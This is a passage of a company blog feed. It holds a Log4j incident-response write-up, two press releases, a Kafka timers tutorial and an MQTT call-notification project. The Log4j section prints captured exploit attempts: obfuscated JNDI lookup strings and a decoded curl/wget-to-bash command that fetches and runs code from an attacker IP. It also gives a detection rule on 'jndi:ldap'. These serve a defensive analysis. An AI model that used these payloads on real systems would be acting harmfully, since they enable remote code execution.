Java class removal consists of removing the Java class from the classpath so that the component will not be able to resolve resources dynamically. Thanks to the use of Docker image, we can simply alter the build recipe to perform the removal and redeploy the image. In a couple of minutes, we can deploy the new logstash component.</p><h2>Log Analysis and Alerting</h2><p>Just after the zero-day was released, we identified an indicator of compromise (IoC) within our logs which is helpful for security forensics. <code>${jndi</code></p><p>Cloudflare wrote a great <a href="https://blog.cloudflare.com/actual-cve-2021-44228-payloads-captured-in-the-wild/">blog post</a> about the traffic they have seen when updating their firewall rules for preventing Log4j exploits.</p><p>For us, we wanted to achieve something similar and ensure that we can monitor our infrastructure from malicious actors probing our public infrastructure. We have centralized logging that acts as our Security Incident Event Monitoring (SIEM) solution. This is based on ElasticSearch, which by the way, was another service we needed to patch because of Log4j, identified by <a href="https://aws.amazon.com/security/security-bulletins/AWS-2021-006/">AWS Security Bulletin</a>. </p><p>To get some ChatOps alerts in slack we use an open-source tool called <a href="https://github.com/Yelp/elastalert">Elstalert</a>. This tool provides the ability to actively monitor and alert based on data within ElasticSearch. We use this for audit and security alerts within our applications and infrastructure. </p><p>To get started, we built the following Elastalert rule:</p><pre><code class="language-yaml">log4j.yaml: |-
  ---
  name: &quot;log4j cve&quot;
  index: logstash-*
  type: any
  realert:
    minutes: 15
  filter:
  - query:
    - query_string:
        query: &quot;\&quot;jndi:ldap\&quot;&quot;
  query_delay:
    minutes: 5
  query_key: &quot;message&quot;
  alert_text_type: alert_text_only
  include : [&quot;kubernetes.container.name&quot;,&quot;message&quot;]
  alert:
  - &quot;slack&quot;
  alert_text: &quot;
  *Container* : {0}\n
  *Message* : {1}&quot;
  alert_text_args: [&quot;kubernetes.container.name&quot;,&quot;message&quot;]
  slack_channel_override: &quot;#cve-2021-44228&quot;
  slack_emoji_override: &quot;:unlock:&quot;
  slack_msg_color: warning
  slack_title: Security RCE attempt for CVE-2021-44228
</code></pre><p>We quickly then began to receive alerts of probing attempts across our environments.</p><p><img src="/img/blog/log4j/03-elastalert.png"/></p><p>The following alerts are <strong>unsuccessful</strong> exploit attempts our infrastructure.</p><p>Let’s take a closer look at some of these exploit attempts to see if we can learn anything..</p><pre><code class="language-bash">[2021-12-10T14:05:52.612 Z] &quot;GET / HTTP/1.1&quot; 307 - 0 0 0 - &quot;45.155.205.233&quot; &quot;${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==}&quot; &quot;34b61b2d-28f6-4e89-9baf-7cd3b4e71698&quot; &quot;54.217.173.83:443&quot; &quot;-&quot;
</code></pre><p>This request was hitting our public API gateway with a base64 encoded payload. Decoding this payload we can see what the actor was trying to accomplish:</p><p>base64 </p><pre><code>KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0M3x8d2dldCAtcSAtTy0gNDUuMTU1LjIwNS4yMzM6NTg3NC81NC4yMTcuMTczLjgzOjQ0Myl8YmFzaA==
</code></pre><p>base64 decoded</p><pre><code>(curl -s 45.155.205.233:5874/54.217.173.83:443||wget -q -O- 45.155.205.233:5874/54.217.173.83:443)|bash
</code></pre><p>If this attack was successful, we can see that the actor is attempting to download a malicious exploit first with <code>curl</code>, then attempt with <code>wget</code> and then execute with the downloaded payload with bash. If this attack was successful we would have received an alert from our Host-based Intrusion Detection System (HIDs) from <a href="https://github.com/falcosecurity/falco">Falco</a>. In addition, it shows the importance of ensuring our images are distroless, without bash and OS dependencies, and blocking egress network traffic if possible, as this would also prevent such an attack.</p><p>Looking at more attempts, we started to see probing attempts using a 3rd party service using <a href="https://github.com/projectdiscovery/interactsh">Interactsh</a>.</p><pre><code class="language-bash">16/Dec/2021:06:11:07 +0000] &quot;GET /?x=${jndi:ldap://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com/a} HTTP/1.1&quot; 302 0 &quot;${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot; &quot;${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}&quot; 685 0.015 [products-developer-portal-8080] 100.98.133.224:8080 0 0.014 302 548d1132926fa0bc9904e12523d2f250 [${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://${hostName}.c6s8ou15g22ssten8u8gcg7po6oyo6dj6.interactsh.com}, 173.249.19.100]
</code></pre><p>We see a lot of requests calling DNS as a mechanism to detect if a system is vulnerable.</p><pre><code class="language-bash">[2021-12-14T22:57:36.722Z] &quot;GET / HTTP/1.1&quot; 307 - 0 0 0 - &quot;51.105.55.17&quot; &quot;/${jndi:ldap://45.83.193.150:1389/Exploit}&quot; &quot;7c9223d6-2c81-491d-8564-10742cc90a9c&quot; &quot;54.75.196.220&quot; &quot;-&quot;
</code></pre><p>In our Tokyo region, we started to see a lot of requests from <code>x00.it</code> domain.</p><pre><code class="language-bash">[14/Dec/2021:17:37:59 +0000] &quot;GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_id.log4jdns.x00.it%2F%7D&amp;page=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_page.log4jdns.x00.it%2F%7D&amp;search=%24%7Bjndi%3Aldap%3A%2F%2Fdivd-0c1679670abeeb68eeabd98981713eea_%24%7Bdate%3AYYYYMMddHHmmss%7D_https_search.log4jdns.x00.it%2F%7D HTTP/1.1&quot; 401 39 &quot;${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_Referer.log4jdns.x00.it/}&quot; &quot;${jndi:ldap://divd-0c1679670abeeb68eeabd98981713eea_${date:YYYYMMddHHmmss}_https_User-Agent.log4jdns.x00.it/}&quot; 4496 0.255 [monitoring-mki-lab-grafana-80] 100.115.164.63:3000 39 0.001 401 d7fa702ee8cc73793707ca6720c57639 [194.5.73.6]
</code></pre><p>In the coming weeks we will continue to monitor the probes across our public infrastructure to see how they evolve.</p><h1>Monday</h1><h2>Docker Vulnerability Scans</h2><p>Next, we wanted to ensure there was not an application running in our Kubernetes clusters with a vulnerable version of Log4j. We know from <a href="https://github.com/cisagov/log4j-affected-db">this resource</a> that there are many open source applications that are vulnerable. To ensure we are not running a tool that is vulnerable, we used Kubernetes API with <a href="https://github.com/kubernetes/kubectl">kubectl</a> and <a href="https://github.com/aquasecurity/trivy">Trivy</a>, a scanner for vulnerabilities in container images.</p><p>First, we built a small POC to ensure that Trivy can identify the CVE-2021-44228.</p><pre><code class="language-bash">❯❯❯ brew install aquasecurity/trivy/trivy
❯❯❯ trivy image birdyman/log4j2-demo:1.0.0-12 | grep CVE-2021-44228 
| org.apache.logging.log4j:log4j-api                     | CVE-2021-44228   | CRITICAL | 2.10.0            | 2.15.0                         | Remote code injection in Log4j                                                  |
</code></pre><p>Now that we know Trivy works, let’s create a small bash script to call Kubectl and Trivy and grep for the Log4j CVE.</p><p><code>trivy-scan-cve.sh CVE-2021-44228</code></p><pre><code class="language-bash">#!/usr/bin/env bash

VULN=$1

echo &quot;Scanning $1...&quot;

imgs=`kubectl get pods -A -o jsonpath=&#x27;{range .items[*]}{.spec.containers[*].image}{&quot; &quot;}&#x27; | tr &quot; &quot; &quot;\n&quot; | sort -u`
for img in ${imgs}; do
  echo &quot;scanning ${img}&quot;
  result=`trivy image --severity CRITICAL ${img}`
  if echo ${result} | grep -q &quot;$1&quot; ; then
    echo -e &quot;${img} is vulnerable, please patch!&quot;
  fi
done
</code></pre><p>We ran the above script across all of our Kubernetes clusters. This was helpful as we then found some additional test services which included the vulnerable Log4j library. These vulnerable services were based on 3rd party open-source applications, therefore we were not able to identify them earlier when looking just through the code dependencies. We took the necessary actions to remediate these services and investigate that there was no malicious traffic from these pods.</p><h2>Monitoring Vendors</h2><p>It is important to note that because we operate in the cloud and also use some vendor components in our mobile core network, we needed to ensure these core components were not affected by Log4j vulnerabilities. In our case, we followed the AWS and Cisco Security Bulletins and update our components when required.</p><h1>What worked well and could be improved</h1><p>During this incident management we have gathered great learnings in the way. </p><p>First of all, our GitOps and centralized software repositories have been critical to remediate very quickly to the vulnerability, enabling us to quickly deploy across our entire infrastructure new components, without interrupting operations or losing any log information in the process. </p><p>Second, while our monorepo and automated scan helped us a lot to identify vulnerable components, they still depend on the availability of up-to-date information. During that incident, we noticed that it was often difficult to rely on those 3rd party components to address a 0day risk. Therefore, we will rely on improving our defense-in-depth by verifying that unnecessary code execution is systematically disabled in our runtimes, improve the sanity of our container images by adopting best practices of the cloud industry.</p><h1>Staying secure</h1><p>All in all, it is important that we have the ability to plan, identify, contain and prevent zero-day vulnerabilities such as Log4j. We only spoke about some of the controls we have in place, but we are continuing to explore new technologies and mechanisms to ensure we build and maintain a secure environment. </p><h1>We are hiring</h1><p>If you are a Security Engineer looking for a new challenge to make a secure mobile core platform, come and say hi. <a href="https://wgtwo.jobs.personio.de/job/423396?display=en">https://wgtwo.jobs.personio.de/job/423396?display=en</a></p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CKH IOD selects Working Group Two for public cloud core network]]></title>
            <link>https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud</link>
            <guid>ckh-iod-wg2-public-cloud</guid>
            <pubDate>Wed, 01 Dec 2021 12:00:00 GMT</pubDate>
            <description><![CDATA[CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS]]></description>
            <content:encoded><![CDATA[<h2>PRESS RELEASE</h2><img src="/img/ckh.png" alt="ckh" width="300"/><ul><li>As an industry-first, CKH IOD migrates its core network to the cloud – delivered as a fully managed software-as-a-service by Working Group Two and deployed on AWS</li><li>A cloud-based core network brings radical simplification, cost efficiency and a platform to leverage a developer community – to drive innovation and capitalize on disruptive technologies</li></ul><p><strong>Oslo/London, 1 December, 2021</strong> – CKH Innovations Opportunities Development (CKH IOD) has entered into a contract with Working Group Two to move its core network to the public cloud. CKH IOD, a telecoms unit and international development hub of CK Hutchison, via a fully managed SaaS by Working Group Two, will deploy its mobile core network on Amazon Web Services (AWS). The agreement means that CKH IOD, and its MVNO, IoT and Private Network customers, can achieve radical simplification, speed up innovation, explore new revenue streams and get to market faster.</p><p>CKH IOD will leverage Working Group Two’s platform to deliver services across the CK Hutchison telecoms footprint in Europe, Asia and its wider international partners.</p><p>By evolving to a software-defined network, CKH IOD radically consolidates its vendor relationships and associated complexities. Working Group Two’s fully managed mobile core network also automates operations and maintenance to deliver a more cost-efficient service.</p><p>“Our collaboration with Working Group Two to deploy our core network on the public cloud delivers simplicity, improved operational efficiency and the ability to quickly develop new initiatives to meet market needs, with particular focus on the MVNO, IoT and Private Network space. It’s about achieving scale and the highest levels of security while reducing complexity – to the benefit of our customers and ultimately, end-users in our markets,” says Joe Parker, CEO of CKH IOD.</p><p>“CKH IOD earns a first-mover advantage by deploying a core built leveraging the webscale playbook. Being built on the cloud and delivered as-a-service, this core enables simplicity, cost efficiency and a continuous evolution of capabilities and features – with no end-of-life. In addition, they get access to a community of partners that build and integrate into the cloud core, giving a vastly enhanced pace of innovation. Under the umbrella of “everything as-a-service” the time has come to include the core network. We are incredibly excited to announce this landmark agreement,” says Erlend Prestgard, CEO of Working Group Two.</p><p>Working Group Two leverages the proven infrastructure and breadth of services from AWS to deploy a cloud-native core network.</p><p>“Working Group Two is a pioneer in building mobile core networks with much of the same philosophy that AWS builds infrastructure. Scalable, secure, consistent and API-driven, delivering the promise of efficiency and rapid innovation at scale,” says David Brown, VP and GM of Amazon EC2.</p><p>“With CKH IOD deciding to host its core network on the public cloud and have it fully managed by a third party under a managed SaaS model, we are witnessing a significant technology shift. By opting for a full set of capabilities from AWS, CKH IOD and Working Group Two can leverage the full benefits of the public cloud, including opening up for new business models. This will allow CKH IOD to scale their services and offerings with superior visibility and control. They will be stimulating a rapid pace of innovation with the highest levels of security and performance,” says Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS.</p><h3>About CKH Innovations Opportunities Development</h3><p>CKH Innovations Opportunities Development is a telecom unit and international development hub of CK Hutchison, creating international and global technological innovations that are built on one of CK Hutchison’s strongest assets, our mobile networks. We offer customised global mobile communications and data solutions that create new digital value and unprecedented opportunities for business. Our collaborative approach combined with our world-class network and experience means we are best placed to help our customers design, adapt, develop and scale solutions faster. Read more at <a href="https://www.ckhiod.com">https://www.ckhiod.com</a></p><h3>About Working Group Two</h3><p>Working Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at <a href="https://wgtwo.com">https://wgtwo.com</a></p><h3>For more information</h3><p>Erlend Prestgard, CEO, Working Group Two, +47 4542 9555, <a href="mailto:erlend@wgtwo.com">erlend@wgtwo.com</a></p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Mitsui Knowledge Industry (MKI) to develop private networks business]]></title>
            <link>https://www.wgtwo.com/blog/mitsui-knowledge-industry-mki-private-networks-business</link>
            <guid>mitsui-knowledge-industry-mki-private-networks-business</guid>
            <pubDate>Tue, 01 Jun 2021 12:00:00 GMT</pubDate>
            <description><![CDATA[Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS]]></description>
            <content:encoded><![CDATA[<h2>PRESS RELEASE</h2><img src="/img/mki.png" alt="mki" width="300"/><p>— Drive the Private NWs Growth with its Fully-Managed Mobile Core NW SaaS —</p><p>CEO Erlend Prestgard of Working Group Two As, Oslo, Norway and President Kengo Asano of Mitsui Knowledge Industry Co., Ltd. Minato-ku, Japan, agreed on an MoU on providing WG2’s fully-managed Mobile Core NW SaaS product to accelerate the Private Networks business in the Japanese market. </p><p>In the Japanese market, there is a clear interest in Private NWs due to the regulatory setup of Private LTE and Local 5G. However, there are complex issues to overcome and Private NWs require professional knowledge to acquire a radio license, to design and operate the Core Network, and to optimize the Radio Network, all with reasonable cost. The MKI-WG2 agreement solves these problems:</p><ul><li>One-stop solution from client’s radio license acquisition to operational support</li><li>WG2’s Mobile Core NW built with a web-scale IT approach to simplify financial and operational aspects of the mobile system</li><li>Parties will encourage and enable the Private NW operators to create new business </li><li>MKI will provide WG2’s Mobile Core SaaS as part of its offering as well as reselling it to other integrators to create a larger ecosystem</li><li>MKI has radio network knowledge, and WG2 provides Mobile Core as a service (SaaS) that radically improves the cost model. With this partnership, both parties will combine those strengths and lift the Private NWs business to the next level. </li></ul><blockquote><p>“Together with MKI, we make the journey of launching feature-rich private networks simple and affordable. MKI’s strong local presence and Working Group Two’s ability to distill complex core networks into simple-to-use APIs allow customers to launch full-service mobile networks at a small scale – with market-leading affordability,” said Erlend Prestgard, CEO and Co-Founder of Working Group Two. </p></blockquote><h2>About Working Group Two (wgtwo)</h2><p>WG2 has rebuilt the mobile core for simplicity, innovation, and efficiency – leveraging the web-scale playbook and operating models. Today, WG2’s innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all G’s.  </p><p>Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services.</p><p>WG2 is an Advanced Technology Partner of AWS: <a href="https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As">https://partners.amazonaws.com/partners/0010h00001ZY6fDAAT/Working%20Group%20Two%20As</a></p><p>WG2 Website: <a href="https://wgtwo.com">https://wgtwo.com</a></p><h3>About Mitsui Knowledge Industry (MKI)</h3><p>Under the slogan “Unite Knowledge, Ignite the Future”, Mitsui Knowledge Industry Co., Ltd. (MKI)  has been creating IT strategies and supporting the digital transformation of its clients as their strategic business partner specializing mainly in information and communication technology. By utilizing its wealth of “KNOWLEDGE” accumulated through its long experience in technological development and innovation continuing for over half a century, MKI remains consistent in its pursuit to live up to the high expectations of its customers as their most reliable “value creator”.</p><p>MKI Website: <a href="https://www.mki.co.jp/english/about/">https://www.mki.co.jp/english/about/</a></p><p>Published: June 1, 2021</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Kafka timers]]></title>
            <link>https://www.wgtwo.com/blog/kafka-timers</link>
            <guid>kafka-timers</guid>
            <pubDate>Sun, 28 Feb 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations]]></description>
            <content:encoded><![CDATA[<p>A timer is a cornerstone of any software that communicates over the network. There are plenty of implementations
that provide a timer facility. Most of them are in memory and will lose scheduled timers should the application crash.
In this blog we discuss durable Kafka timers that do not depend on in memory state. By design
we shall assume 1 second resolution of these timers.</p><p>Before taking on timers let&#x27;s cover some Kafka basics.</p><h2>Kafka concepts</h2><p>There are a few Kafka concepts in play to simulate timers - Kafka topic, Kafka stream, Kafka streams library.
Where <em>topic</em> is append only log of events, <em>stream</em> is a cache of N most recent events on the <em>topic</em>,
and the <em>streams library</em> is a software library implementing the concept of the <em>stream</em>.</p><p>A kafka topic resides inside the Kafka servers, but Kafka streams library keeps track of a topic&#x27;s most recent
events on the application side - the stream. The stream is a key/value cache with random read access unlike
append only topic log. Key/value cache is not the only thing the library provides. It can also join
the streams. When an event and its key appear on a stream, the library looks up the same key in the other streams participating in the join.
It is using key/value cache associated with each stream and gives the result to the application.
The result will have the present event enriched with the matched past events from the joined streams.
Joining two streams will yield the timer callback. Let&#x27;s see how.</p><h2>Implementation</h2><p>Since it is Kafka, timer expiration shall result in an event posted on a topic of user&#x27;s choice at the right time.
This event is delayed until due time by joining two streams: <em>oscillator</em> and <em>timer-request</em>. Callback
event is pushed to <em>timer-request</em> topic with key equal to the expiration timestamp. Oscillator topic
is the clock dial counting seconds since UNIX epoch in real time. At some point it will get to the second
which is equal to the key on <em>timer-request</em> topic, and the join will come up with the callback event.</p><p>An excellent summary on &quot;timer wheel&quot; and other timer algorithms can be found in this linux kernel <a href="https://lwn.net/Articles/156329/">thread</a>.
Our implementation of timers using Kafka resembles the &quot;timer wheel&quot; algorithm with a bucket on each second to keep callbacks.
<em>Oscillator</em> topic models rotating clock dial, <em>timer-request</em> is bucketing callbacks by the expiration timestamp, and join of these two
contains content of the expired bucket with all the callbacks in it. </p><p><img src="/img/blog/kafka-timers/kt.png"/></p><p>There are two Kafka applications running together to service these topics:</p><ul><li>Oscillator</li><li>Futures</li></ul><h3>Oscillator</h3><p>With the resolution of 1 second oscillator keeps pushing <em>oscillator</em> topic:</p><pre><code class="language-kotlin">while (running) {
    val nowSeconds = System.currentTimeMillis() / 1000L
    while (timestampSeconds &lt; nowSeconds) {
        timestampSeconds++
        KafkaProducers.send(
            &quot;oscillator&quot;,
            timestampSeconds.toString(),
            &quot;1&quot;
        )
    }
    Thread.sleep(200)
}
 
</code></pre><h3>Futures</h3><p>When requesting a timer by pushing <em>timer-request</em> topic, the user provides a callback structure
used to dispatch timer event:</p><pre><code>message Future {
    string callBackTopic = 1;
    string callBackKey = 2;
    bytes callBack = 3;
}
</code></pre><p>Joining two streams on the key equal to the UNIX second will give all expired timers, and
their callback coordinates.</p><p>First, setup a join with <em>WINDOW_SIZE</em> large enough to cover the longest timer duration</p><pre><code class="language-kotlin">val oscillator = builder.stream&lt;String, String&gt;(&quot;oscillator&quot;)
val timerRequest = builder.stream(&quot;timer-request&quot;, Consumed.with(Serdes.String(), FutureSerde()))
val timeoutEvents =
    oscillator.join(
            timerRequest,
            { _: String?, future: Future -&gt; future },
            JoinWindows.of(WINDOW_SIZE),
            StreamJoined.with(
                    Serdes.String(),
                    Serdes.String(),
                    FutureSerde()
            ).withThisStoreSupplier(
                    Stores.persistentWindowStore(
                            &quot;join-this-store&quot;,
                            WINDOW_SIZE.plusMinutes(30),
                            WINDOW_SIZE,
                            true
                    )
            ).withOtherStoreSupplier(
                    Stores.persistentWindowStore(
                            &quot;join-other-store&quot;,
                            WINDOW_SIZE.plusMinutes(30),
                            WINDOW_SIZE,
                            true
                    )
            )
    )
</code></pre><p>Second, kick of the processing loop looking for expired timers</p><pre><code class="language-kotlin">timeoutEvents.process(
        ProcessorSupplier {
            object : Processor&lt;String, Future&gt; {
                override fun init(context: ProcessorContext) {}
                override fun process(key: String, value: Future) {
                    KafkaProducers.send(Topic.valueOf(value.callBackTopic),
                            value.callBackKey,
                            value.callBack.toByteArray()
                    )
                    Metrics.timerFired(value.callBackTopic)
                }

                override fun close() {}
            }
        }
)

</code></pre><h3>Cancelling a timer</h3><p>There is no way to cancel these timers as events can&#x27;t be easily removed from the Kafka stream.
Still, it is possible to ignore timer events by using a token in callback request, and a variable
in timer receiver state. When scheduling a timer the receiver puts the same token in two places:</p><ul><li>callback struct it publishes on the <em>timer-request</em> topic</li><li>internal variable timerToken</li></ul><p>As timer fires receiver compares value in timerToken and in the callback event. Based on the result it
draws a conclusion if timer is to be ignored or not. All it has to do to cancel a timer is to reset
value in its timerToken variable. </p><p>Since normally Kafka does &quot;at least once&quot; delivery it is a good idea to reset the timerToken immediately
after notification event.  </p><h3>What to worry about</h3><p>Kafka streams library is using local disk storage to keep the cache. The storage shall be large enough to host
all timer requests based on the product of <em>timer-request</em> topic retention, callback size and timer scheduling rate.
Thankfully Kafka is well-equipped to deal with this sort of troubles.</p><p>Oscillator must keep ticking otherwise timers will stop coming. Make sure to have
metrics/alarms in place to stay on top of Oscillator health. Deploy few of them for redundancy having in
mind the extra load they will generate on timer users.</p><h2>Conclusion</h2><p>There are many options to export application state to the data tier layer. Timers are often part of that
state. Above we showed how to apply Kafka primitives to achieve a goal of making application &quot;stateless&quot; even
if the state is using timers. It has its costs and benefits. </p><p>Check out openings on the <a href="https://wgtwo.com/career">Careers page</a> if you’re interested in building the future Telco backbone.</p>]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Changing the color of your bulbs: The fancy way]]></title>
            <link>https://www.wgtwo.com/blog/mqtt-event-bridge</link>
            <guid>mqtt-event-bridge</guid>
            <pubDate>Thu, 07 Jan 2021 00:00:00 GMT</pubDate>
            <description><![CDATA[Last hackathon I did setup a MQTT integration towards wgtwo's APIs to enable call notifications via my IKEA Trådfri bulb so I can finally notice my wife calling me. The bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.]]></description>
            <content:encoded><![CDATA[<p>Last hackathon I did setup a MQTT integration towards <strong>wgtwo</strong>&#x27;s APIs to enable call notifications via my IKEA Trådfri bulb so I can finally notice my wife calling me. The bulb changes color when my phone is ringing and when I am in a call, without me needing to install anything to my phone.</p><p><img src="/img/blog/mqtt-event-bridge/animation.webp"/></p><hr/><p>There are a variety of events generated by <strong>wgtwo</strong>’s systems for subscriptions on the platform. This includes information such as call events, SMS sent to and from a subscription (including content), voicemail events, location events, and more.</p><p>We offer a <a href="https://docs.wgtwo.com/events/listen-for-events/">gRPC API</a> which enables developers to listen to a selection of these events.</p><p>I wanted to make a super simple setup so that I could configure home automation rules, e.g. <strong>&quot;If someone calls me, make my IKEA bulb change color to notify me&quot;</strong> or <strong>&quot;If I send myself a SMS with &#x27;Leaf ON&#x27;, turn on the heater in my car&quot;</strong>.</p><p>A lot of home automation tools, such as Node-RED and Home Assistant have great MQTT support, so instead of writing a native gRPC integration I wanted to make a more flexible solution by offering these events over MQTT. This way, anyone using a home automation tool with MQTT support can integrate with our platform easily.</p><p>During our last hackathon I built a simple bridge between our events API and MQTT. I wrote this bridge in Go, using <a href="https://github.com/mochi-co/mqtt">Mochi MQTT</a> as an embedded MQTT server.</p><p>The flow is shown in this sketch:
<img src="/img/blog/mqtt-event-bridge/sketch.svg"/></p><p>The way it works is quite simple: You log in to the service using our OAuth solution. You then grant the service access to fetch events on your behalf. The service will then generate a username and password for you.</p><p>The service will fetch events for all subscribers that have enabled it and publish these to the MQTT server with topic <code>{phone number}/events/{type}</code>. With the generated credentials, you may then subscribe to these events.</p><p>Note that nothing of this requires any setup on your phone, so it would work equally well on a 20-30 year old Nokia phone.</p><p>As I&#x27;ll explain in more detail below, I did setup a quick Node-RED flow to consume these events as shown in the video below:</p><h1><a href="/video/blog/mqtt-event-bridge/calling.mp4">video</a></h1><p>Here you can see that:</p><ol><li>The light changes to cool white when the call is initiated (phone not yet ringing)</li><li>It turns pink when the phone is ringing</li><li>It turns red when we pick up the call</li><li>It returns to normal after the call has ended</li></ol><h2>Connecting to <strong>wgtwo</strong>&#x27;s API</h2><p>We will use a normal OAuth2 authorization code grant for logging in to our service.</p><p>To handle this, we used the module <code>github.com/markbates/goth</code> with the following settings:</p><pre><code class="language-go">import &quot;golang.org/x/oauth2&quot;

const endpointProfile string = &quot;https://id.wgtwo.com/userinfo&quot;

var Endpoint = oauth2.Endpoint{
  AuthURL:  &quot;https://id.wgtwo.com/oauth2/auth&quot;,
  TokenURL: &quot;https://id.wgtwo.com/oauth2/token&quot;,
}
</code></pre><p>When logging in, the user will be asked to consent to the following scopes:</p><ul><li>phone: Allowing the service to fetch the user’s phone number</li><li>offline_access: Giving the service a refresh token</li><li>events.voice.subscribe: Allow the service to see all call events</li><li>events.voicemail.subscribe: Allow the service to see if a voicemail has been left</li><li>events.sms.subscribe: Allow the service to get a copy of every SMS sent and received</li></ul><p>All the events you have consented to share with the service will be stored in the service&#x27;s queue.</p><pre><code>sms events        ─╮
voice events      ─┼─▷  queue  ◁── gRPC API
voice mail events ─╯
</code></pre><p>This queue can be consumed by using the events streaming API (<a href="https://docs.wgtwo.com/events/listen-for-events/">docs</a>), which requires the service to use the OAuth2 client credentials grant flow.</p><p>Events will be shared with the service as long as there exists an active consent.</p><p>We then initiate the server side stream to fetch the events:</p><pre><code class="language-go">request := &amp;pb.SubscribeEventsRequest{
  Type:          []pb.EventType{pb.EventType_VOICEMAIL_EVENT},
  StartPosition: &amp;pb.SubscribeEventsRequest_StartAtOldestPossible{},
  ClientId:      uuid.New().String(),
  QueueName:     &quot;wgtwo-mqtt-demo&quot;,
  DurableName:   &quot;wgtwo-mqtt-demo&quot;,
  MaxInFlight:   10,
  ManualAck: &amp;pb.ManualAckConfig{
     Enable:  true,
     Timeout: ptypes.DurationProto(10 * time.Second),
  },
}
r, err := c.Subscribe(context.TODO(), request)

for {
  response, err := r.Recv()
  if err == io.EOF || err != nil {
     break
  }

  event := response.Event
  // PUBLISH EVENT TO MQTT SERVER ON TOPIC {event owner}/events/{type}
}
</code></pre><h2>Connecting to our new MQTT service</h2><p>The service has a very pretty landing page (Disclaimer: I am not a designer).</p><p><img src="/img/blog/mqtt-event-bridge/landing-page.png" alt="landing page"/></p><p>Clicking this button takes you to the login page:</p><div class="post-images halves" markdown="1"> ![](/img/blog/mqtt-event-bridge/login-enter-phonenumber.png) ![](/img/blog/mqtt-event-bridge/login-pin.png)</div><p>… and then asks you to allow our service to get your voice event and new voicemails. As I am only interested in the voice events here, I’ll only grant that.</p><p>As this is an experimental app which hasn’t been approved by anyone, our login page will give you a clear warning about trusting this.</p><div class="post-images single" markdown="1"> ![](/img/blog/mqtt-event-bridge/login-consent.png)</div><p>When that is done, it returns to our app showing this beautiful UI (still not a designer):</p><p><img src="/img/blog/mqtt-event-bridge/success.png"/></p><p>The generated credentials will allow you to listen any topic matching <code>{phone number}/#</code>.</p><p>The following is the output from pasting that mosquitto_sub command in my terminal. It shows that I first called my Swedish number and hanging up before it was actually ringing.</p><pre><code class="language-json">{&quot;event&quot;:{&quot;metadata&quot;:{&quot;sequence&quot;:&quot;1&quot;,&quot;ackInbox&quot;:&quot;_INBOX.VMTx7rnS0i3qXpHfuS5t3b&quot;},&quot;timestamp&quot;:&quot;2021-01-06T11:24:40Z&quot;,&quot;serviceId&quot;:&quot;wotel&quot;,&quot;voiceEvent&quot;:{&quot;callId&quot;:&quot;0c056e2c-07f9-4c2b-b5ca-042f160af42f&quot;,&quot;type&quot;:&quot;CALL_INITIATED&quot;,&quot;fromNumber&quot;:{&quot;e164&quot;:&quot;+4712345678&quot;},&quot;toNumber&quot;:{&quot;e164&quot;:&quot;+46123456789&quot;},&quot;owner&quot;:{&quot;e164&quot;:&quot;+46123456789&quot;}}}}
{&quot;event&quot;:{&quot;metadata&quot;:{&quot;sequence&quot;:&quot;2&quot;,&quot;ackInbox&quot;:&quot;_INBOX.VMTx7rnS0i3qXpHfuS5t3b&quot;},&quot;timestamp&quot;:&quot;2021-01-06T11:24:43Z&quot;,&quot;serviceId&quot;:&quot;wotel&quot;,&quot;voiceEvent&quot;:{&quot;callId&quot;:&quot;0c056e2c-07f9-4c2b-b5ca-042f160af42f&quot;,&quot;type&quot;:&quot;CALL_ENDED&quot;,&quot;fromNumber&quot;:{&quot;e164&quot;:&quot;+4712345678&quot;},&quot;toNumber&quot;:{&quot;e164&quot;:&quot;+46123456789&quot;},&quot;owner&quot;:{&quot;e164&quot;:&quot;+46123456789&quot;}}}}
</code></pre><p>If you run any home automation or other hobby projects at home, chances are that you already have a MQTT broker running.
